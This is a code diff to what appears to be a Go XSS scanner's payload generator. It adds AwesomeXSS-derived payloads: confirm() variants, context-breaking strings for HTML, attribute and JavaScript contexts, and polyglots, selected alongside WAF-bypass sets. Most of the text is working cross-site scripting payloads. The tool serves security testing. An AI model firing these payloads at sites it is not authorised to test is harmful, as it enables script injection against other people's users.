@@ -41,6 +41,10 @@ func (g *Generator) GetPayloads(wafType string) []string {
 	// Start with high-confidence base payloads
 	payloads := g.getBasePayloads()
 
+	// Add AwesomeXSS specific payloads
+	payloads = append(payloads, g.getAwesomeConfirmVariants()...)
+	payloads = append(payloads, g.getAwesomeContextBreaking()...)
+
 	// Add WAF-specific bypass payloads
 	switch strings.ToLower(wafType) {
 	case "cloudflare":
@@ -68,9 +72,69 @@ func (g *Generator) GetPayloads(wafType string) []string {
 	if g.smartMode {
 		payloads = append(payloads, g.getSmartPayloads()...)
 		payloads = append(payloads, g.getPolyglotPayloads()...)
+		payloads = append(payloads, g.getAwesomePolyglots()...)
 	}
 
 	return g.deduplicate(payloads)
+}
+
+// getAwesomeConfirmVariants returns confirm() based payloads from AwesomeXSS
+// confirm() is often less detected than alert()
+func (g *Generator) getAwesomeConfirmVariants() []string {
+	return []string{
+		"confirm()",
+		"confirm``",
+		"(confirm``)",
+		"{confirm``}",
+		"[confirm``]",
+		"(((confirm)))``",
+		"co\\u006efirm()",
+		"new class extends confirm``{}",
+		"[8].find(confirm)",
+		"[8].map(confirm)",
+		"[8].some(confirm)",
+		"[8].every(confirm)",
+		"[8].filter(confirm)",
+		"[8].findIndex(confirm)",
+		"<script>confirm()</script>",
+		"<img src=x onerror=confirm()>",
+		"<svg/onload=confirm()>",
+	}
+}
+
+// getAwesomeContextBreaking returns context breaking payloads from AwesomeXSS
+func (g *Generator) getAwesomeContextBreaking() []string {
+	return []string{
+		// HTML Context
+		"<svg onload=alert(1)>",
+		"</tag><svg onload=alert(1)>",
+
+		// Attribute Context
+		"\"><svg onload=alert(1)>",
+		"\"><svg onload=alert(1)><b attr=\"",
+		"\" onmouseover=alert(1) \"",
+		"\"onmouseover=alert(1)//",
+		"\"autofocus/onfocus=\"alert(1)",
+
+		// JavaScript Context
+		"'-alert(1)-'",
+		"'-alert(1)//'",
+		"'}alert(1);{'",
+		"'}%0Aalert(1);%0A{'",
+		"</script><svg onload=alert(1)>",
+	}
+}
+
+// getAwesomePolyglots returns advanced polyglots from AwesomeXSS
+func (g *Generator) getAwesomePolyglots() []string {
+	return []string{
+		// S0md3v's Polyglot
+		`%0ajavascript:` + "`/*\\\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover=\"/**/ alert()//'\">`",
+
+		// Common Polyglots
+		`javascript://%250Aalert(1)//"/*\'/*"/*\'/*</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*`,
+		`javascript://%250Aalert(1)//"/*\'/*"/*\'/*</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*`,
+	}
 }
 
 // getBasePayloads returns reliable XSS payloads that work in most scenarios
@@ -78,20 +142,18 @@ func (g *Generator) getBasePayloads() []string {
 	return []string{
 		// Classic script tag payloads
 		`<script>alert(1)</script>`,
-		`<script>alert('XSS')</script>`,
-		`<script>alert(document.domain)</script>`,
-		`<script>alert(document.cookie)</script>`,
+		`<script>confirm(1)</script>`,
+		`<script>prompt(1)</script>`,
 
 		// IMG tag payloads
 		`<img src=x onerror=alert(1)>`,
+		`<img src=x onerror=confirm(1)>`,
 		`<img src=x onerror="alert(1)">`,
-		`<img/src=x onerror=alert(1)>`,
-		`<img src="x" onerror="alert(1)">`,
 
 		// SVG payloads
 		`<svg onload=alert(1)>`,
 		`<svg/onload=alert(1)>`,
-		`<svg onload="alert(1)">`,
+		`<svg onload=confirm(1)>`,
 
 		// Body tag payloads
 		`<body onload=alert(1)>`,
@@ -100,7 +162,6 @@ func (g *Generator) getBasePayloads() []string {
 		// Input payloads
 		`<input onfocus=alert(1) autofocus>`,
 		`<input/onfocus=alert(1) autofocus>`,
-		`<input type=text onfocus=alert(1) autofocus>`,
 
 		// Iframe payloads
 		`<iframe src="javascript:alert(1)">`,
@@ -116,7 +177,7 @@ func (g *Generator) getBasePayloads() []string {
 
 		// JavaScript URI payloads
 		`javascript:alert(1)`,
-		`javascript:alert('XSS')`,
+		`javascript:confirm(1)`,
 
 		// Attribute breakout payloads
 		`"><script>alert(1)</script>`,
@@ -127,11 +188,6 @@ func (g *Generator) getBasePayloads() []string {
 		`' onfocus=alert(1) autofocus '`,
 		`"><img src=x onerror=alert(1)>`,
 		`'><img src=x onerror=alert(1)>`,
-
-		// Event handler variations
-		`<div onmouseover=alert(1)>hover me</div>`,
-		`<a href="javascript:alert(1)">click</a>`,
-		`<form action="javascript:alert(1)"><input type=submit>`,
 	}
 }
 
